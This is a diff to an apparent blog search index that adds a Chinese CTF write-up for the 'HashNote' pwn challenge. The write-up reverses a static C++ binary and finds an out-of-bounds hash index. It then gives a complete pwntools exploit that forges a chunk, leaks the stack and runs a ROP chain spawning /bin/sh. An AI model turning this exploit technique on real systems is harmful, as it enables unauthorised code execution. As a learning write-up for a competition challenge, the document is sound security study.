@@ -1081,8 +1081,8 @@
 ]]></content>
       <tags>
         <tag>wp</tag>
+        <tag>学习日志</tag>
         <tag>Pwn</tag>
-        <tag>学习笔日志</tag>
       </tags>
   </entry>
   <entry>
@@ -1170,6 +1170,72 @@
         <tag>学习日志</tag>
         <tag>Pwn</tag>
         <tag>复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>长城杯半决pwn——HashNote</title>
+    <url>/2024/11/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3pwn%E2%80%94%E2%80%94HashNote/</url>
+    <content><![CDATA[<p>(´ΘωΘ&#96;)</p>
+<h2 id="HashNote"><a href="#HashNote" class="headerlink" title="HashNote"></a>HashNote</h2><p>准备国赛的时候协会web手给的题，说是春秋云境靶场里渗透出来的是。</p>
+<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>一打开就是经典无符号，然后是静态编译没有外部库。</p>
+<p>虽然乍一看很恶心，但是逆过go之后看这个还是比较眉清目秀的，很容易找到主函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130204212.png"
+                      alt="20241130204212"
+                ></p>
+<p>然后先猜输入输出函数，其中这个put后面的第一个参数都相同，点进去是.bss段上的东西，空的</p>
+<p>然后 debug 的时候查看内存可以看到在main之前就已经设置好固定的值，指向一些类似<code>vtable for&#39;std::codecvt&lt;char16_t, char, __mbstate_t&gt;</code>的东西。</p>
+<p>基本可以判断这个东西是c++,把这个变量标记为<code>io_puts</code>也只是为了方便之后判断带这个参数<br>的都是输出函数，<code>io_read</code>同理，因为显然这里不会逆出很直接的输入输出流，或者特定函数。</p>
+<p>其实要是之前做过带符号的C++应该就比较容易理解这里一套的，可惜我只做过一半的工作，所以很多细节还是不太清楚。</p>
+<p>然后有一个pwn题比较经典的登陆交互<code>check（）</code>：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130205532.png"
+                      alt="20241130205532"
+                ><br>但是非常好逆，甚至很多交互逻辑可以从这里辅助理解<br>得到登陆密码<code>freep@ssw0rd:3</code></p>
+<p>回到 main ,还是先把一些.bss段上经常出现的地址通过一些调试知道大致意思<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130210029.png"
+                      alt="20241130210029"
+                ></p>
+<p>这里有个一开始一直打不通的交互就是如何change username,后来看了别人的wp，大概猜了一下才懂这里的new username 要把 128 的缓冲区长度全部打满才不会卡住，可能是源程序对于 end 的设置吧。所以说，把缓冲区对齐填满是好习惯。</p>
+<p>然后看子函数：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130210620.png"
+                      alt="20241130210620"
+                ><br>其实我认为这里比较重要的是reset_mem,特意把栈上的数据构造好结构拿来接收数据，关注reset部分的数据变化，可以知道存储数据的结构，和之后伪造 chunk 的结构息息相关</p>
+<p>剩下的就是一通 debug 了解函数功能。大致就是每个<code>data</code>都有特定的<code>key</code>来作为索引,而这个<code>key</code>是通过给定数据算出来的一个0~126哈希，key_data是在 .bss 上的，里面存的是不同的 chunk 的地址, chunk 里存了两个东西，一个是 key ，一个是 data 。 </p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>没有libc，静态编译，自然而然想到打栈，但是要找到一个办法泄露栈地址（一般肯定是就像堆题利用show()一样利用这里的query()）</p>
+<p>然后再看 getshell 的方式，从保护的角度来看没有很大的限制，rop 是比较合理的一种，不过要实现任意地址写（最起码得写到某次 return 后的栈上）</p>
+<p>以及这种.bss段上全局变量特别多的题，往往就是越界写造成一些更大的突破。</p>
+<p>以上差不多是我自己能分析到的程度，然后就 stuck 了，主要是利用的手法和看到的漏洞点中间总是差一口气，于是上网搜搜了搜wp(´ﾟдﾟ&#96;)</p>
+<p>通过调试以及仔细阅读 F5 后的代码：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130214235.png"
+                      alt="20241130214235"
+                ><br>漏洞点在于这里的 while ，校验如果这个哈希对应的 chunk 如果已经存在那么再看 chunk 内 key 的内容是否相同，如果不同则对于这种相同哈希不同key的情况，再往后分配一个chunk。</p>
+<p>在这里没有检查index的范围，也就是说126之外的index也可以被访问到的 key_data[]之后存储的就是 username<br>insert是读，query是写，那么构造username就可以完成任意地址读写</p>
+<p>接下来是泄露栈地址，主要问题是找一个记录了栈地址的地方，搜索到的wp都是在.bss段上某个地址找到的记录了一些程序加载时栈上的痕迹，可能和c++的静态编译或者和这个题目的一些设置相关，但是应该是不至于把程序逆透了才能得到。</p>
+<p>最后的工作：构造相同哈希的key<br>不会，待我请教协会密码手。否则的话就写个脚本爆一下</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./HashNote&#x27;</span></span><br><span class="line"><span class="comment"># libc_path=&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;&quot;.)</span></span><br><span class="line">p= process(elf_path)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line"><span class="comment"># libc=ELF(libc_path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">newname</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;New username: &#x27;</span>,newname.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">key,data</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Key: &#x27;</span>,key)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Data: &#x27;</span>,data)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Key: &#x27;</span>,key)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">key,data</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Key: &#x27;</span>,key)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Data: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x405e7c</span></span><br><span class="line">pop_rsi=<span class="number">0x40974f</span></span><br><span class="line">pop_rax=<span class="number">0x4206ba</span></span><br><span class="line">pop_rdx_rbx=<span class="number">0x53514b</span></span><br><span class="line">syscall=<span class="number">0x4560c6</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">0x5dc980</span></span><br><span class="line">stack=<span class="number">0x5e4fa8</span></span><br><span class="line">ukey=<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------</span></span><br><span class="line">fake_chunk=flat(&#123;</span><br><span class="line">    <span class="number">0</span>:username+<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x10</span>:[username+<span class="number">0x20</span>,<span class="built_in">len</span>(ukey),\</span><br><span class="line">        ukey,<span class="number">0</span>],</span><br><span class="line">    <span class="number">0x30</span>:[stack,<span class="number">0x10</span>]</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Username&#x27;</span>,fake_chunk)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Password: &quot;</span>,<span class="string">b&quot;freep@ssw0rd:3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造</span></span><br><span class="line">insert(<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">1</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span>,<span class="string">b&#x27;test&#x27;</span>) <span class="comment"># 126</span></span><br><span class="line">insert(<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span>,<span class="string">b&#x27;test&#x27;</span>) <span class="comment"># 127 数组越界</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># 任意地址读 leak stack</span></span><br><span class="line">query(<span class="string">b&#x27;\x30&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;\x31&#x27;</span>+<span class="string">b&#x27;\x44&#x27;</span>)</span><br><span class="line">main_ret=u64(p.recv(<span class="number">8</span>))-<span class="number">0x1e0</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------</span></span><br><span class="line">fake_chunk=flat(&#123;</span><br><span class="line">    <span class="number">0</span>:username+<span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x20</span>:[username+<span class="number">0x30</span>,<span class="built_in">len</span>(ukey),\</span><br><span class="line">        ukey,<span class="number">0</span>],</span><br><span class="line">    <span class="number">0x40</span>:[main_ret,<span class="number">0x100</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>]</span><br><span class="line">    &#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">change(fake_chunk) <span class="comment"># 准备任意地址写</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">payload=flat([</span><br><span class="line">    pop_rdi,username+<span class="number">0x50</span>,</span><br><span class="line">    pop_rsi,<span class="number">0</span>,</span><br><span class="line">    pop_rdx_rbx,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    pop_rax,<span class="number">0x3b</span>,</span><br><span class="line">    syscall</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">modify(ukey,payload) <span class="comment"># 任意地址写</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Option: &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>) <span class="comment"># 退出main，触发rop</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
+<li>逆昏头的时候也要适时保持理智</li>
+<li>以及作为攻击者要对各种合法的特殊情况敏感，主动去找特殊情况，比如这道题里不同 key 同哈希的情况。</li>
+</ul>
+<blockquote>
+<p>参考文章：<br><a class="link"   href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat" >pwntools中flat的使用方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.dr0n.top/posts/f249db01/" >https://www.dr0n.top/posts/f249db01/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://fushuling.com/index.php/2024/05/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/" >https://fushuling.com/index.php/2024/05/28/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-greatwall%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>wp</tag>
+        <tag>学习日志</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
 </search>
